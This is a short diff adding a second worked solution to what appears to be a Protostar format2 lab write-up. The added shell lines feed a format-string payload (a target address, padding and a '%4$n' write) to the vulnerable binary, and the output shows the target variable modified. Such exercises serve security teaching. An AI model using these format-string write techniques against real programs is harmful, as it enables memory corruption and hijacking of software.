@@ -186,3 +186,10 @@ user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08' + '%44x%x
 you have modified the target :)
 user@protostar:/opt/protostar/bin$
 ```
+
+```sh
+user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xe4\x96\x04\x08" + "A"*60 + "%4$n"') | ./format2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+you have modified the target :)
+user@protostar:/opt/protostar/bin$
+```
